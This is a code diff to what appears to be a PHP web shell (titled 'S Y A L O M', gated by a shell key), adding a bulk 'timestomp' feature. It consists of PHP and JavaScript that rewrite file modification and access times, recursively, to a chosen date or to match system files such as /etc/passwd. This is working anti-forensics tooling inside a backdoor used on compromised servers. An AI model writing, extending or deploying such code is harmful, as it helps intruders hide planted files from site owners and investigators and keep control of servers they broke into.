@@ -681,6 +681,130 @@ if (isset($_POST['action']) && $_POST['action'] === 'chmod_bulk' && !empty($_POS
     echo json_encode($results);
     exit;
 }
+
+// 🔥 BULK TIMESTOMP - Change file timestamps
+if (isset($_POST['action']) && $_POST['action'] === 'timestomp_bulk' && !empty($_POST['selected_files'])) {
+    header('Content-Type: application/json');
+    
+    $timestamp_str = $_POST['timestomp_time'] ?? '';
+    $recursive = isset($_POST['timestomp_recursive']) && $_POST['timestomp_recursive'] === '1';
+    $reference_file = $_POST['timestomp_reference'] ?? '';
+    
+    $results = [
+        'success' => true,
+        'total' => 0,
+        'success_count' => 0,
+        'failed_count' => 0,
+        'processed' => [],
+        'errors' => [],
+        'timestamp_applied' => ''
+    ];
+    
+    // Determine target timestamp
+    $target_timestamp = time();
+    
+    if (!empty($reference_file) && file_exists($reference_file)) {
+        // Use reference file's timestamp
+        $target_timestamp = filemtime($reference_file);
+        $results['timestamp_applied'] = date('d-m-Y H:i:s', $target_timestamp) . ' (from ' . basename($reference_file) . ')';
+    } elseif (!empty($timestamp_str)) {
+        // Parse DD-MM-YYYY HH:MM:SS format
+        $parsed = DateTime::createFromFormat('d-m-Y H:i:s', $timestamp_str);
+        if ($parsed) {
+            $target_timestamp = $parsed->getTimestamp();
+            $results['timestamp_applied'] = date('d-m-Y H:i:s', $target_timestamp);
+        } else {
+            $results['success'] = false;
+            $results['errors'][] = 'Invalid timestamp format. Use: DD-MM-YYYY HH:MM:SS';
+            echo json_encode($results);
+            exit;
+        }
+    } else {
+        $results['timestamp_applied'] = date('d-m-Y H:i:s', $target_timestamp) . ' (current time)';
+    }
+    
+    // Function to recursively timestomp
+    function timestomp_recursive($path, $timestamp, &$results) {
+        if (!file_exists($path)) {
+            $results['errors'][] = 'Not found: ' . $path;
+            $results['failed_count']++;
+            return false;
+        }
+        
+        $success = @touch($path, $timestamp, $timestamp);
+        $parentDir = dirname($path);
+        
+        $results['processed'][] = [
+            'path' => $path,
+            'name' => basename($path),
+            'dir' => $parentDir,
+            'type' => is_dir($path) ? 'dir' : 'file',
+            'success' => $success,
+            'new_time' => date('d-m-Y H:i:s', $timestamp)
+        ];
+        
+        if ($success) {
+            $results['success_count']++;
+        } else {
+            $results['errors'][] = 'Failed: ' . $path;
+            $results['failed_count']++;
+        }
+        $results['total']++;
+        
+        // If directory and recursive, process children
+        if ($success && is_dir($path)) {
+            $items = @scandir($path);
+            if ($items) {
+                foreach ($items as $item) {
+                    if ($item === '.' || $item === '..') continue;
+                    $childPath = $path . DIRECTORY_SEPARATOR . $item;
+                    timestomp_recursive($childPath, $timestamp, $results);
+                }
+            }
+        }
+        
+        return $success;
+    }
+    
+    // Process each selected file/folder
+    foreach ($_POST['selected_files'] as $file) {
+        $targetPath = $dir . DIRECTORY_SEPARATOR . basename($file);
+        
+        if ($recursive && is_dir($targetPath)) {
+            timestomp_recursive($targetPath, $target_timestamp, $results);
+        } else {
+            if (file_exists($targetPath)) {
+                $success = @touch($targetPath, $target_timestamp, $target_timestamp);
+                $parentDir = dirname($targetPath);
+                
+                $results['processed'][] = [
+                    'path' => $targetPath,
+                    'name' => basename($targetPath),
+                    'dir' => $parentDir,
+                    'type' => is_dir($targetPath) ? 'dir' : 'file',
+                    'success' => $success,
+                    'new_time' => date('d-m-Y H:i:s', $target_timestamp)
+                ];
+                
+                if ($success) {
+                    $results['success_count']++;
+                } else {
+                    $results['errors'][] = 'Failed: ' . $targetPath;
+                    $results['failed_count']++;
+                }
+                $results['total']++;
+            } else {
+                $results['errors'][] = 'Not found: ' . $targetPath;
+                $results['failed_count']++;
+                $results['total']++;
+            }
+        }
+    }
+    
+    echo json_encode($results);
+    exit;
+}
+
 if (isset($_POST['action']) && $_POST['action'] === 'unzip_file' && !empty($_POST['unzip_target'])) {
     $targetFile = $dir . DIRECTORY_SEPARATOR . basename($_POST['unzip_target']);
     $zip = new ZipArchive;
@@ -2349,7 +2473,7 @@ function list_dir($path) {
     $files = @scandir($path);
     if (!$files) return '<div class="error">Cannot open directory</div>';
     
-    $html = "<div class='file-actions'><button id='zipSelectedBtn' disabled>Zip Selected</button> <button id='chmodSelectedBtn' disabled style='background: #ff9800; color: #111;'>Chmod Bulk</button> <button id='deleteSelectedBtn' disabled style='background: #d32f2f; color: white;'>Delete Selected</button></div>";
+    $html = "<div class='file-actions'><button id='zipSelectedBtn' disabled>Zip Selected</button> <button id='chmodSelectedBtn' disabled style='background: #ff9800; color: #111;'>Chmod Bulk</button> <button id='timestompSelectedBtn' disabled style='background: #ff5722; color: white;'>⏰ Timestomp</button> <button id='deleteSelectedBtn' disabled style='background: #d32f2f; color: white;'>Delete Selected</button></div>";
     $html .= "<table class='file-table' data-sort-col='2' data-sort-dir='asc'><thead><tr>";
     $html .= "<th><input type='checkbox' id='selectAll'></th>";
     $html .= "<th></th>";
@@ -2600,7 +2724,7 @@ function list_dir($path) {
 <body>
 <div class="container">
     <div class="menu-panel">
-        <h1>::S Y A L O M:: ~ 270326 1937</h1>
+        <h1>::S Y A L O M:: ~ 270326 1956</h1>
         <!-- Quick Actions Row -->
         <div class="section">
             <h3>⚡ Quick Actions</h3>
@@ -2845,6 +2969,75 @@ function list_dir($path) {
         </div>
     </div>
 </div>
+
+<!-- 🔥 TIMESTOMP BULK MODAL -->
+<div class="modal" id="timestompBulkModal">
+    <div class="modal-content" style="max-width: 800px; width: 90vw; max-height: 90vh; display: flex; flex-direction: column;">
+        <div class="modal-header" style="flex-shrink: 0;">
+            <h3>⏰ Timestomp Bulk</h3>
+            <button onclick="closeModal('timestompBulkModal')" style="padding: 4px 12px;">✕</button>
+        </div>
+        <div style="padding: 15px; overflow-y: auto; flex: 1;">
+            <div style="background: #1a1a1a; border: 1px solid #333; padding: 10px; border-radius: 4px; margin-bottom: 15px; font-size: 11px; color: #888;">
+                <strong style="color: #f80;">ℹ️ Info:</strong> Timestomp mengubah timestamp modification (mtime) dan access (atime) file. 
+                Format waktu: <code style="background: #000; padding: 2px 4px;">DD-MM-YYYY HH:MM:SS</code>
+            </div>
+            
+            <div style="display: flex; gap: 15px; margin-bottom: 15px; flex-wrap: wrap;">
+                <div style="flex: 2; min-width: 250px;">
+                    <label style="font-size: 12px; color: #888; display: block; margin-bottom: 5px;">
+                        Selected: <span id="timestompBulkCount" style="color: #f80; font-weight: bold;">0</span> items
+                    </label>
+                    <label style="font-size: 12px; color: #f80; display: block; margin-bottom: 5px;">⏰ Timestamp (DD-MM-YYYY HH:MM:SS):</label>
+                    <input type="text" id="timestompBulkTime" placeholder="31-12-2026 23:59:59" 
+                           style="width: 100%; padding: 8px; background: #222; color: #f80; border: 1px solid #f80; border-radius: 4px; font-family: monospace;">
+                </div>
+                <div style="flex: 1; min-width: 200px;">
+                    <label style="font-size: 12px; color: #888; display: block; margin-bottom: 5px;">📋 Quick Presets:</label>
+                    <select id="timestompBulkPreset" onchange="applyTimestompPreset(this.value)" 
+                            style="width: 100%; padding: 8px; background: #222; color: #0f0; border: 1px solid #0f0; border-radius: 4px; margin-bottom: 8px;">
+                        <option value="">-- Select Preset --</option>
+                        <option value="/etc/passwd">📄 /etc/passwd</option>
+                        <option value="/bin/ls">🔧 /bin/ls</option>
+                        <option value="/etc/hosts">📄 /etc/hosts</option>
+                        <option value="1year">📅 1 Year Ago</option>
+                        <option value="6months">📅 6 Months Ago</option>
+                        <option value="1month">📅 1 Month Ago</option>
+                        <option value="1week">📅 1 Week Ago</option>
+                        <option value="yesterday">📅 Yesterday</option>
+                        <option value="now">⏰ Now (Current)</option>
+                    </select>
+                </div>
+            </div>
+            
+            <div style="display: flex; gap: 15px; margin-bottom: 15px; flex-wrap: wrap;">
+                <div style="flex: 1; min-width: 200px;">
+                    <label style="font-size: 12px; color: #888; display: flex; align-items: center; cursor: pointer; padding: 8px; background: #1a1a1a; border-radius: 4px; border: 1px solid #333;">
+                        <input type="checkbox" id="timestompBulkRecursive" style="margin-right: 8px;">
+                        <span>🔁 Recursive (apply to subfolders & files)</span>
+                    </label>
+                </div>
+            </div>
+            
+            <div id="timestompBulkProgress" style="display: none; margin-bottom: 15px; padding: 10px; background: #111; border: 1px solid #333; border-radius: 4px;">
+                <div style="font-size: 11px; color: #888; margin-bottom: 5px;">
+                    Progress: <span id="timestompBulkCurrent" style="color: #f80; font-weight: bold;">0</span> / <span id="timestompBulkTotal">0</span>
+                </div>
+                <div style="height: 6px; background: #333; border-radius: 3px; overflow: hidden;">
+                    <div id="timestompBulkProgressBar" style="height: 100%; background: linear-gradient(90deg, #f80, #f44); width: 0%; transition: width 0.3s;"></div>
+                </div>
+                <div id="timestompBulkStatus" style="font-size: 11px; color: #f80; margin-top: 5px;">Initializing...</div>
+            </div>
+            
+            <div id="timestompBulkResults" style="display: none; max-height: 50vh; overflow-y: auto; font-size: 12px; font-family: monospace; background: #000; padding: 10px; border: 1px solid #333; border-radius: 4px;"></div>
+        </div>
+        <div class="modal-footer" style="flex-shrink: 0; border-top: 1px solid #333; padding: 10px 15px;">
+            <button id="timestompBulkExecuteBtn" onclick="executeTimestompBulk()" style="background: #ff5722; color: #fff; font-weight: bold; padding: 8px 20px;">⏰ Execute Timestomp</button>
+            <button type="button" onclick="closeModal('timestompBulkModal')" id="timestompBulkCloseBtn" style="padding: 8px 20px;">Cancel</button>
+        </div>
+    </div>
+</div>
+
 <div class="modal" id="serverInfoModal">
     <div class="modal-content">
         <div class="modal-header">
@@ -3420,6 +3613,7 @@ document.addEventListener('click', function(e) {
 });
 const zipBtn = document.getElementById('zipSelectedBtn');
 const chmodBulkBtn = document.getElementById('chmodSelectedBtn');
+const timestompBtn = document.getElementById('timestompSelectedBtn');
 const deleteBtn = document.getElementById('deleteSelectedBtn');
 const selectAllCheckbox = document.getElementById('selectAll');
 document.addEventListener('change', function(e) {
@@ -3427,6 +3621,7 @@ document.addEventListener('change', function(e) {
         const anyChecked = document.querySelectorAll('.file-select:checked').length > 0;
         zipBtn.disabled = !anyChecked;
         chmodBulkBtn.disabled = !anyChecked;
+        timestompBtn.disabled = !anyChecked;
         deleteBtn.disabled = !anyChecked;
     }
 });
@@ -3472,6 +3667,11 @@ chmodBulkBtn.addEventListener('click', function() {
     document.getElementById('chmodBulkCloseBtn').textContent = 'Cancel';
     
     openModal('chmodBulkModal');
+});
+
+// Timestomp Bulk button click
+timestompBtn.addEventListener('click', function() {
+    openTimestompBulkModal();
 });
 
 // Chmod Bulk execute function
@@ -3603,6 +3803,211 @@ document.getElementById('chmodBulkPerm').addEventListener('change', function() {
         customDiv.style.display = 'none';
     }
 });
+
+// 🔥 TIMESTOMP BULK FUNCTIONS
+
+// Apply preset timestamp
+function applyTimestompPreset(preset) {
+    const timeInput = document.getElementById('timestompBulkTime');
+    if (!preset) return;
+    
+    const now = new Date();
+    let targetDate = new Date();
+    
+    switch(preset) {
+        case '1year':
+            targetDate.setFullYear(now.getFullYear() - 1);
+            break;
+        case '6months':
+            targetDate.setMonth(now.getMonth() - 6);
+            break;
+        case '1month':
+            targetDate.setMonth(now.getMonth() - 1);
+            break;
+        case '1week':
+            targetDate.setDate(now.getDate() - 7);
+            break;
+        case 'yesterday':
+            targetDate.setDate(now.getDate() - 1);
+            break;
+        case 'now':
+            targetDate = now;
+            break;
+        default:
+            // Reference file - will be handled server-side
+            timeInput.value = '';
+            timeInput.placeholder = 'Using: ' + preset;
+            timeInput.dataset.reference = preset;
+            return;
+    }
+    
+    // Format: DD-MM-YYYY HH:MM:SS
+    const day = String(targetDate.getDate()).padStart(2, '0');
+    const month = String(targetDate.getMonth() + 1).padStart(2, '0');
+    const year = targetDate.getFullYear();
+    const hours = String(targetDate.getHours()).padStart(2, '0');
+    const minutes = String(targetDate.getMinutes()).padStart(2, '0');
+    const seconds = String(targetDate.getSeconds()).padStart(2, '0');
+    
+    timeInput.value = `${day}-${month}-${year} ${hours}:${minutes}:${seconds}`;
+    delete timeInput.dataset.reference;
+}
+
+// Open timestomp modal
+function openTimestompBulkModal() {
+    const checkboxes = document.querySelectorAll('.file-select:checked');
+    if (checkboxes.length === 0) {
+        alert('Please select at least one file or folder');
+        return;
+    }
+    
+    document.getElementById('timestompBulkCount').textContent = checkboxes.length;
+    
+    // Reset form
+    document.getElementById('timestompBulkTime').value = '';
+    document.getElementById('timestompBulkPreset').value = '';
+    document.getElementById('timestompBulkRecursive').checked = false;
+    document.getElementById('timestompBulkProgress').style.display = 'none';
+    document.getElementById('timestompBulkResults').style.display = 'none';
+    
+    // Reset buttons
+    const executeBtn = document.getElementById('timestompBulkExecuteBtn');
+    const closeBtn = document.getElementById('timestompBulkCloseBtn');
+    executeBtn.disabled = false;
+    executeBtn.textContent = '⏰ Execute Timestomp';
+    closeBtn.textContent = 'Cancel';
+    
+    openModal('timestompBulkModal');
+}
+
+// Execute timestomp bulk
+async function executeTimestompBulk() {
+    const checkboxes = document.querySelectorAll('.file-select:checked');
+    const timeInput = document.getElementById('timestompBulkTime');
+    const recursive = document.getElementById('timestompBulkRecursive').checked;
+    
+    let timestamp = timeInput.value.trim();
+    let referenceFile = '';
+    
+    // Check if using reference file
+    if (timeInput.dataset.reference) {
+        referenceFile = timeInput.dataset.reference;
+        timestamp = '';
+    } else if (!timestamp) {
+        alert('Please enter a timestamp or select a preset');
+        return;
+    }
+    
+    // UI updates
+    const executeBtn = document.getElementById('timestompBulkExecuteBtn');
+    const closeBtn = document.getElementById('timestompBulkCloseBtn');
+    const progressDiv = document.getElementById('timestompBulkProgress');
+    const resultsDiv = document.getElementById('timestompBulkResults');
+    const progressBar = document.getElementById('timestompBulkProgressBar');
+    const currentSpan = document.getElementById('timestompBulkCurrent');
+    const totalSpan = document.getElementById('timestompBulkTotal');
+    const statusDiv = document.getElementById('timestompBulkStatus');
+    
+    executeBtn.disabled = true;
+    executeBtn.textContent = '⏳ Processing...';
+    closeBtn.textContent = 'Running...';
+    progressDiv.style.display = 'block';
+    resultsDiv.style.display = 'block';
+    resultsDiv.innerHTML = '<div style="color:#f80">🚀 Starting timestomp operation...</div>';
+    
+    const files = Array.from(checkboxes).map(cb => cb.value);
+    
+    try {
+        const formData = new FormData();
+        formData.append('action', 'timestomp_bulk');
+        if (timestamp) formData.append('timestomp_time', timestamp);
+        if (referenceFile) formData.append('timestomp_reference', referenceFile);
+        formData.append('timestomp_recursive', recursive ? '1' : '0');
+        files.forEach(f => formData.append('selected_files[]', f));
+        
+        statusDiv.textContent = 'Sending request...';
+        
+        const response = await fetch('', { method: 'POST', body: formData });
+        const data = await response.json();
+        
+        if (data.success) {
+            totalSpan.textContent = data.total;
+            currentSpan.textContent = data.total;
+            progressBar.style.width = '100%';
+            
+            // Sort: success first, then failed
+            const sortedItems = data.processed.sort((a, b) => {
+                if (a.success === b.success) return 0;
+                return a.success ? -1 : 1;
+            });
+            
+            // Build results
+            let html = '';
+            html += '<div style="margin-bottom:10px;padding:8px;background:#1a1a1a;border-radius:4px;display:flex;gap:15px;flex-wrap:wrap;">';
+            html += '<span style="color:#0f0">✅ Success: ' + data.success_count + '</span>';
+            html += '<span style="color:#f44">❌ Failed: ' + data.failed_count + '</span>';
+            html += '<span style="color:#888">Total: ' + data.total + '</span>';
+            html += '<span style="color:#f80">⏰ Applied: ' + escapeHtml(data.timestamp_applied || 'Unknown') + '</span>';
+            html += '</div>';
+            
+            // Show processed items (limited to first 100)
+            const displayItems = sortedItems.slice(0, 100);
+            displayItems.forEach(item => {
+                const icon = item.type === 'dir' ? '📁' : '📄';
+                const color = item.success ? '#0f0' : '#f44';
+                const status = item.success ? '✓' : '✗';
+                const encodedDir = encodeURIComponent(item.dir);
+                
+                html += '<div style="margin:3px 0;font-size:11px;display:flex;align-items:center;gap:8px;">';
+                html += '<span style="color:' + color + ';font-weight:bold;min-width:15px;">' + status + '</span>';
+                html += '<span style="color:#888">' + icon + '</span>';
+                html += '<a href="?masuk=<?php echo AL_SHELL_KEY ?>&d=' + encodedDir + '" ';
+                html += 'target="_blank" style="color:#6cf;text-decoration:none;word-break:break-all;flex:1;" ';
+                html += 'title="Open: ' + escapeHtml(item.dir) + '">';
+                html += escapeHtml(item.path);
+                html += '</a>';
+                if (item.new_time) {
+                    html += '<span style="color:#f80;font-size:10px;">' + escapeHtml(item.new_time) + '</span>';
+                }
+                html += '</div>';
+            });
+            
+            if (sortedItems.length > 100) {
+                html += '<div style="color:#888;font-size:10px;margin-top:10px;padding:5px;background:#111;border-radius:4px;">';
+                html += '... and ' + (sortedItems.length - 100) + ' more items (showing first 100)</div>';
+            }
+            
+            // Show errors if any
+            if (data.failed_count > 0) {
+                html += '<div style="margin-top:15px;padding:8px;background:#2a0000;border-radius:4px;border:1px solid #f44;">';
+                html += '<div style="color:#f44;font-weight:bold;margin-bottom:8px;">❌ Failed Items Summary:</div>';
+                const failedItems = sortedItems.filter(item => !item.success).slice(0, 20);
+                failedItems.forEach(item => {
+                    html += '<div style="color:#f88;font-size:10px;margin:2px 0;word-break:break-all;">• ' + escapeHtml(item.path) + '</div>';
+                });
+                if (data.failed_count > 20) {
+                    html += '<div style="color:#888;font-size:10px;margin-top:5px;">... and ' + (data.failed_count - 20) + ' more failed</div>';
+                }
+                html += '</div>';
+            }
+            
+            resultsDiv.innerHTML = html;
+            statusDiv.innerHTML = '<span style="color:#0f0;font-weight:bold;">✅ Timestomp Completed!</span>';
+            
+            executeBtn.textContent = '✅ Done';
+            closeBtn.textContent = 'Close';
+        } else {
+            throw new Error(data.errors?.[0] || 'Server returned error');
+        }
+    } catch (error) {
+        resultsDiv.innerHTML = '<div style="color:#f44">❌ Error: ' + escapeHtml(error.message) + '</div>';
+        statusDiv.innerHTML = '<span style="color:#f44">❌ Failed</span>';
+        executeBtn.disabled = false;
+        executeBtn.textContent = '⏰ Retry';
+        closeBtn.textContent = 'Close';
+    }
+}
+
 function unzipFile(fileName) {
     if (confirm(`Unzip "${fileName}"?`)) {
         const formData = new FormData();
